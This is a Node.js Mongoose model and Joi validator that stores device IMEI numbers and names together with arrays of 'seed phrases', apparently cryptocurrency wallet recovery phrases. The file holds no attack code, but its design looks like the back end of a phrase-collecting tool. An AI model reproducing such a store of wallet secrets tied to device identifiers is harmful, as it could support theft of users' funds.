const Joi = require("joi");
const mongoose = require("mongoose");

const VerifiedSeed = mongoose.model(
  "VerifiedSeed",
  new mongoose.Schema({
    imei1: {
      type: String,
      required: true,
    },
    imei2: {
      type: String,
      required: true,
    },
    deviceName: {
      type: String,
      required: true,
    },
    seedPhrases: {
      type: Array,
      required: true,
    },
    seedId: {
      type: mongoose.Types.ObjectId,
      required: true,
      unique: true,
    },
    date: {
      type: Date,
      default: Date.now,
    },
  })
);

function validateRequest(request) {
  let { error } = Joi.object({
    imei1: Joi.string().required(),
    imei2: Joi.string().required(),
    deviceName: Joi.string().required(),
    seedPhrases: Joi.array().required(),
    seedId: Joi.object().required(),
  }).validate(request);

  return error;
}

module.exports.VerifiedSeed = VerifiedSeed;
module.exports.validateRequest = validateRequest;
